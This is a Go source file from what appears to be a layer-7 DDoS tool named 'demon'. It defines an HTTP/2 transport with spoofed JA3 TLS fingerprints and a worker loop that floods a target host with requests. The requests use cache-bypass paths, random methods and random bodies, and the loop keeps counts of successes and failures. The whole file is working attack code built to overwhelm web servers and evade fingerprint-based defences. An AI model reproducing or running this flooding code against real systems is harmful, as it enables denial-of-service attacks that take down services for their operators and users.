package l7

import (
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/0xTM7/demon/internal/config"
	"github.com/0xTM7/demon/internal/utils"
	"golang.org/x/net/http2"
)

func NewH2Transport(Cfg *config.DemonConfig) http.RoundTripper {
	TLS := BuildTLSConfig(Cfg.JA3)
	TLS.ServerName = Cfg.Host
	TLS.NextProtos = []string{"h2"}

	T2 := &http2.Transport{
		TLSClientConfig: TLS,
		DialTLS: func(Network, Addr string, Cfg *tls.Config) (net.Conn, error) {
			return tls.DialWithDialer(
				&net.Dialer{Timeout: 10 * time.Second, KeepAlive: 30 * time.Second},
				Network, Addr, Cfg,
			)
		},
		AllowHTTP:          false,
		DisableCompression: false,
		PingTimeout:        5 * time.Second,
	}
	return T2
}

func RunH2Worker(Cfg *config.DemonConfig, Stop <-chan struct{}) {
	Client := &http.Client{
		Transport: NewH2Transport(Cfg),
		Timeout:   15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for {
		select {
		case <-Stop:
			return
		default:
			Path := CacheBypassPath(Cfg.Path)
			URL := fmt.Sprintf("%s://%s%s", Cfg.Scheme, Cfg.Host, Path)

			Method := Cfg.Method
			if Method == config.MethodRANDOM {
				Method = L7Methods[rand.Intn(len(L7Methods))]
			}

			var Body io.Reader
			var BodyStr string
			if Method == config.MethodPOST || Method == config.MethodPUT || Method == config.MethodPATCH {
				BodyStr = utils.RandString(utils.RandInt(128, 1024))
				Body = strings.NewReader(BodyStr)
			}

			Req, Err := http.NewRequest(string(Method), URL, Body)
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
				continue
			}

			Headers := BuildHeaders(Cfg, Path)
			for K, V := range Headers {
				Req.Header.Set(K, V)
			}

			if BodyStr != "" {
				Req.Header.Set("Content-Length", fmt.Sprintf("%d", len(BodyStr)))
			}

			Resp, Err := Client.Do(Req)
			if Err != nil {
				Cfg.Stats.Failed.Add(1)
				continue
			}

			N, _ := io.Copy(io.Discard, Resp.Body)
			Resp.Body.Close()

			Cfg.Stats.Requests.Add(1)
			Cfg.Stats.BytesSent.Add(N)
			if Resp.StatusCode < 400 {
				Cfg.Stats.Success.Add(1)
			} else {
				Cfg.Stats.Failed.Add(1)
			}
		}
	}
}
